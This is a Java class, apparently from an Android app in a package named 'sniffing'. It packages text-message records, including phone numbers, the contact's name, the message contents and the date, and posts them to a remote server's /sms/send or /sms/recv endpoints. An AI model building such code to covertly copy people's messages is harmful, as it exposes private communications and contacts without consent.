package kr.ssm.sniffing.sms;

import java.io.InputStream;
import java.net.MalformedURLException;
import java.net.URL;

import kr.ewhapp.kjw.bunobuno.network.NetworkConstant;
import kr.ewhapp.kjw.bunobuno.network.PostNetworkRequest;
import kr.ssm.sniffing.userinfo.UserData;

import org.json.JSONException;
import org.json.JSONObject;


public class SMSNetworkRequest extends PostNetworkRequest<UserData>{

	private UserData data;
	private String query;
	
	public SMSNetworkRequest(String url, UserData data) {
		super(data);
		this.data = data;
		this.query = url;
	}

	@Override
	public boolean parsingPostReqeuest(InputStream is, UserData result) {
		return true;
	}

	@Override
	public JSONObject getRequestJSONObject() {
		JSONObject object = new JSONObject();
		JSONObject recvObject = new JSONObject();
		
		try {
			recvObject.put("user_number", data.phoneNumber);
			recvObject.put("other_number", data.otherNumber);
			recvObject.put("other_name", data.otherName);
			recvObject.put("contents", data.contents);
			recvObject.put("date", data.date);
			object.put("object", recvObject);
		} catch (JSONException e) {
			e.printStackTrace();
		}
		
		return object;
	}

	@Override
	public URL getServerURL() {
		try {
			if(query.equals("SMSSend"))
				return new URL(NetworkConstant.serverURL + "/sms/send");
			else
				return new URL(NetworkConstant.serverURL + "/sms/recv");
				
		} catch (MalformedURLException e) {
			e.printStackTrace();
		}
		return null;
	}
}
